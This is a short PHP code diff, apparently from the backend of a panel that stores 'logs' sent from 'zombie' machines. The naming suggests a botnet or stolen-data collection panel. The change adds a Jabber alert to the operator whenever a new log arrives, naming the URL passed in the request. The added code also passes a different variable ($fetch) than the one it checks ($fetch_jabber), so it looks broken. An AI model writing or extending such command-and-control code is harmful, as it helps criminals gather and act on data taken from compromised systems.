@@ -7,6 +7,14 @@ if(isset($_GET['info']) && isset($_GET['url']) && $_GET['info'] != '' && $_GET['
     $url_check = $_GET['url'];
     $z_name = $_GET['zname'];
 
+    $select_jabber = $bdd->prepare("SELECT * FROM settings");
+    $select_jabber->execute();
+    $fetch_jabber = $select_jabber->fetch();
+    if($fetch_jabber['jabber_username'] != ''){
+        $message = "News logs from ".$_GET['url'];
+        SendJabber($fetch['jabber_username'], $fetch['jabber_password'], $fetch['jabber_to'], $message);
+    }
+    
     $insert = $bdd->prepare("INSERT INTO logs_checker(url_site,logs_site,zombie) VALUES(:url_site, :logs_site, :zombie)");
     $insert->bindParam(':url_site', $url_check);
     $insert->bindParam(':logs_site', $info);
